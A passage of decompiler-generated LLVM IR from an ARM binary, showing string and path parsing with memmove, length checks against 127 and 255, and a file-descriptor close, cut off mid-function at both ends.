  %v2_a6c4 = inttoptr i32 %v1_a6c4 to i8*
  %v3_a6c4 = load i8, i8* %v2_a6c4, align 1
  %v4_a6c4 = zext i8 %v3_a6c4 to i32
  store i32 %v4_a6c4, i32* %r3.global-to-local, align 4
  %v2_a6c8 = icmp ugt i8 %v3_a6c4, 114
  store i1 %v2_a6c8, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a6c8 = icmp ult i8 %v3_a6c4, 115
  store i1 %v6_a6c8, i1* %cpsr_n.global-to-local, align 1
  %v7_a6c8 = icmp eq i8 %v3_a6c4, 115
  store i1 %v7_a6c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a6c8, label %bb235, label %.thread63

bb235:                                            ; preds = %dec_label_pc_a6b8
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 8, i32* %stack_var_-40, align 4
  br label %.thread63

.thread63:                                        ; preds = %dec_label_pc_a6b8, %bb235
  %v3_a6d8 = phi i32 [ 7, %dec_label_pc_a6b8 ], [ 8, %bb235 ]
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  store i32 %v0_a6c4, i32* %r0.global-to-local, align 4
  %v1_a6e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_a6e0 = sub i32 %v1_a6e0, %v3_a6d8
  store i32 %v2_a6e0, i32* %r2.global-to-local, align 4
  %v2_a6e4 = add i32 %v3_a6d8, %v0_a6c4
  store i32 %v2_a6e4, i32* %r1.global-to-local, align 4
  %v3_a6e8 = call i32 @_memmove(i32 %v0_a6c4, i32 %v2_a6e4, i32 %v2_a6e0)
  store i32 %v3_a6e8, i32* %r0.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  %v0_a6f0 = load i32, i32* @r7, align 4
  store i32 %v0_a6f0, i32* %stack_var_-40, align 4
  store i32 %v2_8fd8, i32* %r1.global-to-local, align 4
  %v1_a6f8 = load i32, i32* @r4, align 4
  %v2_a6f8 = add i32 %v1_a6f8, %v2_8fd8
  %v3_a6f8 = inttoptr i32 %v2_a6f8 to i8*
  %v4_a6f8 = load i8, i8* %v3_a6f8, align 1
  %v6_a6f8 = zext i8 %v4_a6f8 to i32
  store i32 %v6_a6f8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_a6fc = icmp eq i8 %v4_a6f8, 0
  store i1 %v2_a6fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a6fc, label %dec_label_pc_a740, label %dec_label_pc_a704

dec_label_pc_a704:                                ; preds = %.thread63
  %v2_a704 = icmp ugt i8 %v4_a6f8, 46
  store i1 %v2_a704, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a704 = icmp ult i8 %v4_a6f8, 47
  store i1 %v6_a704, i1* %cpsr_n.global-to-local, align 1
  %v7_a704 = icmp eq i8 %v4_a6f8, 47
  store i1 %v7_a704, i1* %cpsr_z.global-to-local, align 1
  %v1_a708 = load i32, i32* @r5, align 4
  br i1 %v7_a704, label %bb236, label %dec_label_pc_a710

bb236:                                            ; preds = %dec_label_pc_a704
  store i32 %v1_a708, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_a8a0

dec_label_pc_a710:                                ; preds = %dec_label_pc_a704
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_a720

dec_label_pc_a718:                                ; preds = %dec_label_pc_a720
  %v2_a718 = icmp ugt i8 %v4_a72c, 46
  store i1 %v2_a718, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a718 = icmp ult i8 %v4_a72c, 47
  store i1 %v6_a718, i1* %cpsr_n.global-to-local, align 1
  %v7_a718 = icmp eq i8 %v4_a72c, 47
  store i1 %v7_a718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a718, label %dec_label_pc_a8a0, label %dec_label_pc_a720

dec_label_pc_a720:                                ; preds = %dec_label_pc_a718, %dec_label_pc_a710
  %v0_a734 = phi i32 [ %v1_a734, %dec_label_pc_a718 ], [ 1, %dec_label_pc_a710 ]
  store i32 %v0_a734, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  store i32 %v0_a734, i32* %stack_var_-40, align 4
  %v2_a72c = add i32 %v0_a734, %v1_a708
  %v3_a72c = inttoptr i32 %v2_a72c to i8*
  %v4_a72c = load i8, i8* %v3_a72c, align 1
  %v6_a72c = zext i8 %v4_a72c to i32
  store i32 %v6_a72c, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_a730 = icmp eq i8 %v4_a72c, 0
  store i1 %v2_a730, i1* %cpsr_z.global-to-local, align 1
  %v1_a734 = add i32 %v0_a734, 1
  store i32 %v1_a734, i32* %r3.global-to-local, align 4
  store i32 %v2_a72c, i32* %r1.global-to-local, align 4
  br i1 %v2_a730, label %dec_label_pc_a740, label %dec_label_pc_a718

dec_label_pc_a740:                                ; preds = %dec_label_pc_a720, %.thread63, %dec_label_pc_a8a0
  %v0_a740 = load i32, i32* @r5, align 4
  store i32 %v0_a740, i32* %r0.global-to-local, align 4
  %v1_a744 = inttoptr i32 %v0_a740 to i8*
  %v2_a744 = call i32 @function_1460c(i8* %v1_a744)
  store i32 %v2_a744, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a748 = icmp slt i32 %v2_a744, 0
  store i1 %v1_a748, i1* %cpsr_n.global-to-local, align 1
  %v2_a748 = icmp eq i32 %v2_a744, 0
  store i1 %v2_a748, i1* %cpsr_z.global-to-local, align 1
  %tmp237 = icmp slt i32 %v2_a744, 1
  br i1 %tmp237, label %dec_label_pc_a76c, label %dec_label_pc_a750

dec_label_pc_a750:                                ; preds = %dec_label_pc_a740
  %v0_a750 = load i32, i32* @r5, align 4
  store i32 %v0_a750, i32* %r0.global-to-local, align 4
  %v1_a754 = inttoptr i32 %v0_a750 to i8*
  %v2_a754 = call i32 @function_1460c(i8* %v1_a754)
  store i32 %v2_a754, i32* %r0.global-to-local, align 4
  %v1_a758 = add i32 %v2_a754, -127
  %v2_a758 = icmp ugt i32 %v2_a754, 126
  store i1 %v2_a758, i1* %cpsr_c.global-to-local, align 1
  %v3_a758 = sub i32 126, %v2_a754
  %v4_a758 = and i32 %v3_a758, %v2_a754
  %v5_a758 = icmp slt i32 %v4_a758, 0
  store i1 %v5_a758, i1* %cpsr_v.global-to-local, align 1
  %v6_a758 = icmp slt i32 %v1_a758, 0
  store i1 %v6_a758, i1* %cpsr_n.global-to-local, align 1
  %v7_a758 = icmp eq i32 %v2_a754, 127
  store i1 %v7_a758, i1* %cpsr_z.global-to-local, align 1
  %v7_a75c = icmp sgt i32 %v2_a754, 127
  br i1 %v7_a75c, label %.thread66, label %bb238

bb238:                                            ; preds = %dec_label_pc_a750
  %v8_a75c = load i32, i32* %sb.global-to-local, align 4
  %v9_a760 = add i32 %v8_a75c, 789
  store i32 %v9_a760, i32* %r0.global-to-local, align 4
  %v8_a764 = load i32, i32* @r5, align 4
  store i32 %v8_a764, i32* %r1.global-to-local, align 4
  br label %.thread66

.thread66:                                        ; preds = %dec_label_pc_a750, %bb238
  store i32 42860, i32* %lr.global-to-local, align 4
  %v3_a768 = xor i1 %v6_a758, %v5_a758
  %v4_a768 = or i1 %v7_a758, %v3_a768
  call void @__pseudo_cond_branch(i1 %v4_a768, i32 ptrtoint (i32* @global_var_14634.103 to i32))
  br label %dec_label_pc_a76c

dec_label_pc_a76c:                                ; preds = %dec_label_pc_a740, %.thread66
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v3_a770 = load i32, i32* %stack_var_-40, align 4
  %v0_a774 = load i32, i32* @r5, align 4
  %v2_a774 = add i32 %v3_a770, 1
  %v1_a778 = add i32 %v2_a774, %v0_a774
  store i32 %v1_a778, i32* %r0.global-to-local, align 4
  %v1_a77c = inttoptr i32 %v1_a778 to i8*
  %v2_a77c = call i32 @function_1460c(i8* %v1_a77c)
  store i32 %v2_a77c, i32* %r0.global-to-local, align 4
  %v1_a780 = add i32 %v2_a77c, -255
  %v2_a780 = icmp ugt i32 %v2_a77c, 254
  store i1 %v2_a780, i1* %cpsr_c.global-to-local, align 1
  %v3_a780 = sub i32 254, %v2_a77c
  %v4_a780 = and i32 %v3_a780, %v2_a77c
  %v5_a780 = icmp slt i32 %v4_a780, 0
  store i1 %v5_a780, i1* %cpsr_v.global-to-local, align 1
  %v6_a780 = icmp slt i32 %v1_a780, 0
  store i1 %v6_a780, i1* %cpsr_n.global-to-local, align 1
  %v7_a780 = icmp eq i32 %v2_a77c, 255
  store i1 %v7_a780, i1* %cpsr_z.global-to-local, align 1
  %v8_a784 = icmp sgt i32 %v2_a77c, 255
  br i1 %v8_a784, label %dec_label_pc_a158, label %dec_label_pc_a788

dec_label_pc_a788:                                ; preds = %dec_label_pc_a76c
  %v0_a788 = load i32, i32* %sb.global-to-local, align 4
  %v1_a78c = add i32 %v0_a788, 533
  store i32 %v1_a78c, i32* @r4, align 4
  store i32 %v1_a78c, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_a798 = call i32 @function_146ac(i32 %v1_a78c, i32 255)
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  %v3_a7a0 = load i32, i32* %stack_var_-40, align 4
  %v0_a7a4 = load i32, i32* @r5, align 4
  %v2_a7a4 = add i32 %v3_a7a0, 1
  %v1_a7a8 = add i32 %v2_a7a4, %v0_a7a4
  store i32 %v1_a7a8, i32* %r0.global-to-local, align 4
  %v1_a7ac = inttoptr i32 %v1_a7a8 to i8*
  %v2_a7ac = call i32 @function_1460c(i8* %v1_a7ac)
  store i32 %v2_a7ac, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a7b0 = icmp slt i32 %v2_a7ac, 0
  store i1 %v1_a7b0, i1* %cpsr_n.global-to-local, align 1
  %v2_a7b0 = icmp eq i32 %v2_a7ac, 0
  store i1 %v2_a7b0, i1* %cpsr_z.global-to-local, align 1
  %tmp239 = icmp slt i32 %v2_a7ac, 1
  br i1 %tmp239, label %dec_label_pc_a158, label %dec_label_pc_a7b8

dec_label_pc_a7b8:                                ; preds = %dec_label_pc_a788
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  %v3_a7bc = load i32, i32* %stack_var_-40, align 4
  %v0_a7c0 = load i32, i32* @r5, align 4
  %v0_a7c4 = load i32, i32* @r4, align 4
  store i32 %v0_a7c4, i32* @r0, align 4
  %v2_a7c0 = add i32 %v3_a7bc, 1
  %v1_a7c8 = add i32 %v2_a7c0, %v0_a7c0
  store i32 %v1_a7c8, i32* %r1.global-to-local, align 4
  %v2_a7cc = inttoptr i32 %v0_a7c4 to i8*
  %v3_a7cc = call i32 @function_14634(i8* %v2_a7cc, i32 %v1_a7c8)
  store i32 %v3_a7cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a158

dec_label_pc_a7d4:                                ; preds = %dec_label_pc_9b28
  %v0_a7d4 = load i32, i32* @r8, align 4
  %v1_a7d4 = add i32 %v0_a7d4, -1456
  %v2_a7d4 = inttoptr i32 %v1_a7d4 to i32*
  %v3_a7d4 = load i32, i32* %v2_a7d4, align 4
  store i32 %v3_a7d4, i32* %r0.global-to-local, align 4
  %v1_a7d8 = call i32 @_close(i32 %v3_a7d4)
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_a7e4 = load i32, i32* @r8, align 4
  %v2_a7e4 = add i32 %v1_a7e4, -1456
  %v3_a7e4 = inttoptr i32 %v2_a7e4 to i32*
  store i32 -1, i32* %v3_a7e4, align 4
  %v0_a7e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_a7e8 = trunc i32 %v0_a7e8 to i8
  %v2_a7e8 = load i32, i32* @r8, align 4
  %v3_a7e8 = add i32 %v2_a7e8, -1452
  %v4_a7e8 = inttoptr i32 %v3_a7e8 to i8*
  store i8 %v1_a7e8, i8* %v4_a7e8, align 1
  br label %dec_label_pc_9590

dec_label_pc_a7f0:                                ; preds = %dec_label_pc_a3a8
  %v0_a7f0 = load i32, i32* @r8, align 4
  %v1_a7f0 = add i32 %v0_a7f0, -1452
  %v2_a7f0 = inttoptr i32 %v1_a7f0 to i8*
  %v3_a7f0 = load i8, i8* %v2_a7f0, align 1
  %v4_a7f0 = zext i8 %v3_a7f0 to i32
  store i32 %v4_a7f0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_a7f4 = icmp eq i8 %v3_a7f0, 0
  store i1 %v2_a7f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a7f4, label %dec_label_pc_9590, label %dec_label_pc_a158

dec_label_pc_a800:                                ; preds = %dec_label_pc_a618
  %v0_a800 = load i32, i32* @r4, align 4
  store i32 %v0_a800, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_14f6c.76 to i32), i32* %r1.global-to-local, align 4
  %v3_a808 = inttoptr i32 %v0_a800 to i8*
  %v4_a808 = call i32 @function_149ec(i8* %v3_a808, i32 ptrtoint ([4 x i8]* @global_var_14f6c.76 to i32))
  store i32 %v4_a808, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a80c = icmp slt i32 %v4_a808, 0
  store i1 %v1_a80c, i1* %cpsr_n.global-to-local, align 1
  %v2_a80c = icmp eq i32 %v4_a808, 0
  store i1 %v2_a80c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a80c, label %bb240, label %dec_label_pc_a64c

bb240:                                            ; preds = %dec_label_pc_a800
  %v0_a814 = load i32, i32* %fp.global-to-local, align 4
  %v1_a814 = load i32, i32* @r5, align 4
  %v2_a814 = sub i32 %v0_a814, %v1_a814
  %v3_a814 = icmp uge i32 %v0_a814, %v1_a814
  store i1 %v3_a814, i1* %cpsr_c.global-to-local, align 1
  %v4_a814 = xor i32 %v1_a814, %v0_a814
  %v5_a814 = xor i32 %v2_a814, %v0_a814
  %v6_a814 = and i32 %v5_a814, %v4_a814
  %v7_a814 = icmp slt i32 %v6_a814, 0
  store i1 %v7_a814, i1* %cpsr_v.global-to-local, align 1
  %v8_a814 = icmp slt i32 %v2_a814, 0
  store i1 %v8_a814, i1* %cpsr_n.global-to-local, align 1
  %v9_a814 = icmp eq i32 %v0_a814, %v1_a814
  store i1 %v9_a814, i1* %cpsr_z.global-to-local, align 1
  %v7_a818 = icmp sgt i32 %v0_a814, %v1_a814
  %. = select i1 %v7_a818, i32 10, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v9_a820 = trunc i32 %. to i8
  %v10_a820 = load i32, i32* @r8, align 4
  %v11_a820 = add i32 %v10_a820, -1452
  %v12_a820 = inttoptr i32 %v11_a820 to i8*
  store i8 %v9_a820, i8* %v12_a820, align 1
  br label %dec_label_pc_a654

dec_label_pc_a82c:                                ; preds = %dec_label_pc_a2a0
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 36, i32* %r0.global-to-local, align 4
  %v0_a834 = load i32, i32* @r8, align 4
  %v1_a834 = add i32 %v0_a834, 656
  %v2_a834 = inttoptr i32 %v1_a834 to i32*
  %v3_a834 = load i32, i32* %v2_a834, align 4
  store i32 %v3_a834, i32* @r4, align 4
  %v3_a838 = call i32 @function_13c04(i32 36, i32* null)
  %v0_a83c = load i32, i32* @r4, align 4
  store i32 %v0_a83c, i32* %r1.global-to-local, align 4
  store i32 %v3_a838, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_a848 = load i32, i32* @r7, align 4
  store i32 %v0_a848, i32* %r0.global-to-local, align 4
  %v4_a84c = call i32 @function_146d0(i32 %v0_a848, i32 %v0_a83c, i32 %v3_a838, i32 11)
  store i32 %v4_a84c, i32* %r0.global-to-local, align 4
  %v0_a850 = load i32, i32* @r8, align 4
  %v1_a850 = add i32 %v0_a850, 656
  %v2_a850 = inttoptr i32 %v1_a850 to i32*
  %v3_a850 = load i32, i32* %v2_a850, align 4
  %v0_a854 = load i32, i32* @r7, align 4
  %v2_a854 = add i32 %v0_a854, %v4_a84c
  store i32 %v2_a854, i32* @r5, align 4
  store i32 %v4_a84c, i32* @r4, align 4
  %v2_a85c = sub i32 %v3_a850, %v4_a84c
  store i32 %v2_a85c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14fa8.105 to i32), i32* %r2.global-to-local, align 4
  %v0_a864 = load i32, i32* @sl, align 4
  store i32 %v0_a864, i32* %r3.global-to-local, align 4
  store i32 %v2_a854, i32* %r0.global-to-local, align 4
  %v4_a86c = call i32 @function_146d0(i32 %v2_a854, i32 %v2_a85c, i32 ptrtoint (i32* @global_var_14fa8.105 to i32), i32 %v0_a864)
  store i32 %v4_a86c, i32* %r0.global-to-local, align 4
  %v0_a870 = load i32, i32* @r8, align 4
  %v1_a870 = add i32 %v0_a870, 12
  %v2_a870 = inttoptr i32 %v1_a870 to i32*
  %v3_a870 = load i32, i32* %v2_a870, align 4
  store i32 %v3_a870, i32* %r3.global-to-local, align 4
  %v0_a874 = load i32, i32* @r4, align 4
  %v2_a874 = add i32 %v0_a874, %v4_a86c
  store i32 %v2_a874, i32* %r6.global-to-local, align 4
  %v1_a878 = load i32, i32* %sb.global-to-local, align 4
  %v2_a878 = add i32 %v1_a878, %v2_a874
  store i32 %v2_a878, i32* %r2.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v1_a880 = add i32 %v3_a870, -4
  %v2_a880 = icmp ugt i32 %v3_a870, 3
  store i1 %v2_a880, i1* %cpsr_c.global-to-local, align 1
  %v3_a880 = sub i32 3, %v3_a870
  %v4_a880 = and i32 %v3_a880, %v3_a870
  %v5_a880 = icmp slt i32 %v4_a880, 0
  store i1 %v5_a880, i1* %cpsr_v.global-to-local, align 1
  %v6_a880 = icmp slt i32 %v1_a880, 0
  store i1 %v6_a880, i1* %cpsr_n.global-to-local, align 1
  %v7_a880 = icmp eq i32 %v3_a870, 4
  store i1 %v7_a880, i1* %cpsr_z.global-to-local, align 1
  %v3_a884 = add i32 %v2_a878, 2115
  %v4_a884 = inttoptr i32 %v3_a884 to i8*
  store i8 0, i8* %v4_a884, align 1
  %v7_a888 = icmp sgt i32 %v3_a870, 4
  br i1 %v7_a888, label %dec_label_pc_a88c, label %dec_label_pc_a914

dec_label_pc_a88c:                                ; preds = %dec_label_pc_a82c, %dec_label_pc_a914, %dec_label_pc_a924
  store i32 -1, i32* %r6.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_a894 = load i32, i32* @r8, align 4
  %v2_a894 = add i32 %v1_a894, 8
  %v3_a894 = inttoptr i32 %v2_a894 to i32*
  store i32 -1, i32* %v3_a894, align 4
  %v0_a898 = load i32, i32* %r3.global-to-local, align 4
  %v1_a898 = trunc i32 %v0_a898 to i8
  %v2_a898 = load i32, i32* @r8, align 4
  %v3_a898 = add i32 %v2_a898, -1452
  %v4_a898 = inttoptr i32 %v3_a898 to i8*
  store i8 %v1_a898, i8* %v4_a898, align 1
  br label %dec_label_pc_9590

dec_label_pc_a8a0:                                ; preds = %dec_label_pc_a718, %bb236
  %v2_a8a4 = phi i32 [ %v1_a708, %bb236 ], [ %v2_a72c, %dec_label_pc_a718 ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_a8a4 = inttoptr i32 %v2_a8a4 to i8*
  store i8 0, i8* %v3_a8a4, align 1
  br label %dec_label_pc_a740

dec_label_pc_a8ac:                                ; preds = %dec_label_pc_a148
  %v0_a8ac = load i32, i32* %sb.global-to-local, align 4
  %v1_a8b0 = add i32 %v0_a8ac, 533
  store i32 %v1_a8b0, i32* @r4, align 4
  store i32 %v1_a8b0, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_a8bc = call i32 @function_146ac(i32 %v1_a8b0, i32 255)
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  %v3_a8c4 = load i32, i32* %stack_var_-40, align 4
  %v0_a8c8 = load i32, i32* @r5, align 4
  %v2_a8c8 = add i32 %v3_a8c4, 1
  %v1_a8cc = add i32 %v2_a8c8, %v0_a8c8
  store i32 %v1_a8cc, i32* %r0.global-to-local, align 4
  %v1_a8d0 = inttoptr i32 %v1_a8cc to i8*
  %v2_a8d0 = call i32 @function_1460c(i8* %v1_a8d0)
  store i32 %v2_a8d0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a8d4 = icmp slt i32 %v2_a8d0, 0
  store i1 %v1_a8d4, i1* %cpsr_n.global-to-local, align 1
  %v2_a8d4 = icmp eq i32 %v2_a8d0, 0
  store i1 %v2_a8d4, i1* %cpsr_z.global-to-local, align 1
  %tmp241 = icmp slt i32 %v2_a8d0, 1
  br i1 %tmp241, label %dec_label_pc_a158, label %dec_label_pc_a8dc

dec_label_pc_a8dc:                                ; preds = %dec_label_pc_a8ac
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v3_a8e0 = load i32, i32* %stack_var_-40, align 4
  %v0_a8e4 = load i32, i32* @r5, align 4
  %v2_a8e4 = add i32 %v3_a8e0, 1
  %v1_a8e8 = add i32 %v2_a8e4, %v0_a8e4
  store i32 %v1_a8e8, i32* %r0.global-to-local, align 4
  %v1_a8ec = inttoptr i32 %v1_a8e8 to i8*
  %v2_a8ec = call i32 @function_1460c(i8* %v1_a8ec)
  store i32 %v2_a8ec, i32* %r0.global-to-local, align 4
  %v1_a8f0 = add i32 %v2_a8ec, -255
  %v2_a8f0 = icmp ugt i32 %v2_a8ec, 254
  store i1 %v2_a8f0, i1* %cpsr_c.global-to-local, align 1
  %v3_a8f0 = sub i32 254, %v2_a8ec
  %v4_a8f0 = and i32 %v3_a8f0, %v2_a8ec
  %v5_a8f0 = icmp slt i32 %v4_a8f0, 0
  store i1 %v5_a8f0, i1* %cpsr_v.global-to-local, align 1
  %v6_a8f0 = icmp slt i32 %v1_a8f0, 0
  store i1 %v6_a8f0, i1* %cpsr_n.global-to-local, align 1
  %v7_a8f0 = icmp eq i32 %v2_a8ec, 255
  store i1 %v7_a8f0, i1* %cpsr_z.global-to-local, align 1
  %v8_a8f4 = icmp sgt i32 %v2_a8ec, 255
  br i1 %v8_a8f4, label %dec_label_pc_a158, label %dec_label_pc_a8f8

dec_label_pc_a8f8:                                ; preds = %dec_label_pc_a8dc
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  %v3_a8fc = load i32, i32* %stack_var_-40, align 4
  %v0_a900 = load i32, i32* @r5, align 4
  %v0_a904 = load i32, i32* @r4, align 4
  store i32 %v0_a904, i32* @r0, align 4
  %v2_a900 = add i32 %v3_a8fc, 1
  %v1_a908 = add i32 %v2_a900, %v0_a900
  store i32 %v1_a908, i32* %r1.global-to-local, align 4
  %v2_a90c = inttoptr i32 %v0_a904 to i8*
  %v3_a90c = call i32 @function_14634(i8* %v2_a90c, i32 %v1_a908)
  store i32 %v3_a90c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a158

dec_label_pc_a914:                                ; preds = %dec_label_pc_a82c
  %v0_a914 = load i32, i32* @r5, align 4
  store i32 %v0_a914, i32* %r0.global-to-local, align 4
  %v1_a918 = inttoptr i32 %v0_a914 to i8*
  %v2_a918 = call i32 @function_1460c(i8* %v1_a918)
  store i32 %v2_a918, i32* %r0.global-to-local, align 4
  %v1_a91c = add i32 %v2_a918, -127
  %v2_a91c = icmp ugt i32 %v2_a918, 126
  store i1 %v2_a91c, i1* %cpsr_c.global-to-local, align 1
  %v3_a91c = sub i32 126, %v2_a918
  %v4_a91c = and i32 %v3_a91c, %v2_a918
  %v5_a91c = icmp slt i32 %v4_a91c, 0
  store i1 %v5_a91c, i1* %cpsr_v.global-to-local, align 1
  %v6_a91c = icmp slt i32 %v1_a91c, 0
  store i1 %v6_a91c, i1* %cpsr_n.global-to-local, align 1
  %v7_a91c = icmp eq i32 %v2_a918, 127
  store i1 %v7_a91c, i1* %cpsr_z.global-to-local, align 1
  %v8_a920 = icmp sgt i32 %v2_a918, 127
  br i1 %v8_a920, label %dec_label_pc_a88c, label %dec_label_pc_a924

dec_label_pc_a924:                                ; preds = %dec_label_pc_a914
  %v0_a924 = load i32, i32* @r8, align 4
  %v1_a924 = add i32 %v0_a924, 12
  %v2_a924 = inttoptr i32 %v1_a924 to i32*
  %v3_a924 = load i32, i32* %v2_a924, align 4
  store i32 %v1_a168, i32* %r2.global-to-local, align 4
  %v1_a92c = and i32 %v3_a924, 33554432
  %v2_a92c = icmp ne i32 %v1_a92c, 0
  store i1 %v2_a92c, i1* %cpsr_c.global-to-local, align 1
  %v3_a92c = mul i32 %v3_a924, 128
  %v0_a930 = load i32, i32* @r5, align 4
  store i32 %v0_a930, i32* %r1.global-to-local, align 4
  %v2_a934 = add i32 %v3_a92c, %v1_a168
  store i32 %v2_a934, i32* @r0, align 4
  %v2_a938 = inttoptr i32 %v2_a934 to i8*
  %v3_a938 = call i32 @function_14634(i8* %v2_a938, i32 %v0_a930)
  store i32 %v3_a938, i32* %r0.global-to-local, align 4
  %v0_a93c = load i32, i32* @r8, align 4
  %v1_a93c = add i32 %v0_a93c, 12
  %v2_a93c = inttoptr i32 %v1_a93c to i32*
  %v3_a93c = load i32, i32* %v2_a93c, align 4
  store i32 %v1_a168, i32* %r3.global-to-local, align 4
  %v1_a944 = and i32 %v3_a93c, 33554432
  %v2_a944 = icmp ne i32 %v1_a944, 0
  store i1 %v2_a944, i1* %cpsr_c.global-to-local, align 1
  %v3_a944 = mul i32 %v3_a93c, 128
  %v2_a948 = add i32 %v3_a944, %v1_a168
  store i32 %v2_a948, i32* %r4.global-to-local, align 4
  store i32 %v2_a948, i32* %r0.global-to-local, align 4
  %v1_a950 = inttoptr i32 %v2_a948 to i8*
  %v2_a950 = call i32 @function_1460c(i8* %v1_a950)
  store i32 ptrtoint (i32* @global_var_14fac.107 to i32), i32* %r1.global-to-local, align 4
  %v2_a958 = add i32 %v2_a948, %v2_a950
  store i32 %v2_a958, i32* @r0, align 4
  %v2_a95c = inttoptr i32 %v2_a958 to i8*
  %v3_a95c = call i32 @function_14634(i8* %v2_a95c, i32 ptrtoint (i32* @global_var_14fac.107 to i32))
  store i32 %v3_a95c, i32* %r0.global-to-local, align 4
  %v0_a960 = load i32, i32* %r6.global-to-local, align 4
  %v1_a960 = add i32 %v0_a960, 3
  store i32 %v1_a960, i32* @r4, align 4
  %v0_a964 = load i32, i32* @r8, align 4
  %v1_a964 = add i32 %v0_a964, 656
  %v2_a964 = inttoptr i32 %v1_a964 to i32*
  %v3_a964 = load i32, i32* %v2_a964, align 4
  %v0_a968 = load i32, i32* @r7, align 4
  %v2_a968 = add i32 %v0_a968, %v1_a960
  store i32 %v2_a968, i32* %r6.global-to-local, align 4
  %v2_a96c = sub i32 %v3_a964, %v1_a960
  store i32 %v2_a96c, i32* %r1.global-to-local, align 4
  %v0_a970 = load i32, i32* @sl, align 4
  store i32 %v0_a970, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14fa8.105 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a968, i32* %r0.global-to-local, align 4
  %v4_a97c = call i32 @function_146d0(i32 %v2_a968, i32 %v2_a96c, i32 ptrtoint (i32* @global_var_14fa8.105 to i32), i32 %v0_a970)
  store i32 %v4_a97c, i32* %r0.global-to-local, align 4
  %v0_a980 = load i32, i32* @r8, align 4
  %v1_a980 = add i32 %v0_a980, 12
  %v2_a980 = inttoptr i32 %v1_a980 to i32*
  %v3_a980 = load i32, i32* %v2_a980, align 4
  store i32 %v1_a168, i32* %ip.global-to-local, align 4
  %v1_a988 = and i32 %v3_a980, 33554432
  %v2_a988 = icmp ne i32 %v1_a988, 0
  store i1 %v2_a988, i1* %cpsr_c.global-to-local, align 1
  %v3_a988 = mul i32 %v3_a980, 128
  %v0_a98c = load i32, i32* @r4, align 4
  %v1_a98c = load i32, i32* %sb.global-to-local, align 4
  %v2_a990 = add i32 %v3_a988, %v1_a168
  store i32 %v2_a990, i32* @r5, align 4
  %v2_a98c = add i32 %v0_a98c, %v4_a97c
  %v2_a994 = add i32 %v2_a98c, %v1_a98c
  store i32 %v2_a994, i32* @r4, align 4
  %v0_a998 = load i32, i32* %fp.global-to-local, align 4
  %v1_a998 = trunc i32 %v0_a998 to i8
  %v3_a998 = add i32 %v2_a994, 2115
  %v4_a998 = inttoptr i32 %v3_a998 to i8*
  store i8 %v1_a998, i8* %v4_a998, align 1
  %v0_a99c = load i32, i32* @r5, align 4
  store i32 %v0_a99c, i32* %r0.global-to-local, align 4
  %v1_a9a0 = inttoptr i32 %v0_a99c to i8*
  %v2_a9a0 = call i32 @function_1460c(i8* %v1_a9a0)
  %v0_a9a4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_a9a4, i32* %r1.global-to-local, align 4
  %v0_a9a8 = load i32, i32* @r5, align 4
